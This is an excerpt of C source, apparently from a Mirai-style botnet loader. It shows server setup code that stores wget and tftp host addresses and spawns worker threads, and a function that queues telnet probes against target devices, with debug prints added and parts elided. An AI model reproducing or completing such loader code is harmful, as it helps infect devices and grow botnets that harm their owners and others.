...
{
    printf("[DEBUG] server_create: Starting server creation...\n");
    printf("[DEBUG] server_create: threads=%d, addr_len=%d, max_open=%d\n", threads, addr_len, max_open);
    ...
    #ifdef DEBUG
        printf("[DEBUG] server_create: max open %d, wget addr %s:%d, tftp addr %s\n", srv->max_open, srv->wget_host_ip, srv->wget_host_port, srv->tftp_host_ip);
    #endif

    if(srv->estab_conns == NULL)
    {
        printf("[DEBUG] server_create: Failed to allocate established_connections array\n");
        exit(0);
    }
    printf("[DEBUG] server_create: Allocated %d connection slots\n", max_open * 2);
    
    printf("[DEBUG] server_create: Initializing %d connection objects...\n", max_open * 2);
    for(i = 0; i < max_open * 2; i++)
    {
        srv->estab_conns[i] = calloc(1, sizeof(struct connection));
        if(srv->estab_conns[i] == NULL)
        {
            printf("[DEBUG] server_create: Failed to allocate connection %d\n", i);
            exit(-1);
        }
        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);
    }
    printf("[DEBUG] server_create: All connection objects initialized\n");

    printf("[DEBUG] server_create: Creating %d worker threads...\n", threads);
    for(i = 0; i < threads; i++)
    {
        ...
        {
            printf("[DEBUG] server_create: Failed to initialize epoll context for worker %d. Error code %d\n", i, errno);
            free(srv->workers);
            free(srv);
            return NULL;
        }

        printf("[DEBUG] server_create: Starting worker thread %d\n", i);
...
{
    printf("[DEBUG] server_queue_telnet: Starting telnet probe\n");
    printf("[DEBUG] server_queue_telnet: Current open connections: %d, max: %d\n", ATOMIC_GET(&srv->curr_open), srv->max_open);
    
    while(ATOMIC_GET(&srv->curr_open) >= srv->max_open)
    {
        printf("[DEBUG] server_queue_telnet: Waiting for connection slot, current: %d\n", ATOMIC_GET(&srv->curr_open));
        sleep(1);
    }

    printf("[DEBUG] server_queue_telnet: Incrementing connection count\n");
    ATOMIC_INC(&srv->curr_open);

    if(srv == NULL)
    {
        printf("[DEBUG] server_queue_telnet: ERROR - srv == NULL!\n");
    }

    printf("[DEBUG] server_queue_telnet: Calling server_telnet_probe\n");
    server_telnet_probe(srv, info);
    printf("[DEBUG] server_queue_telnet: server_telnet_probe completed\n");
}
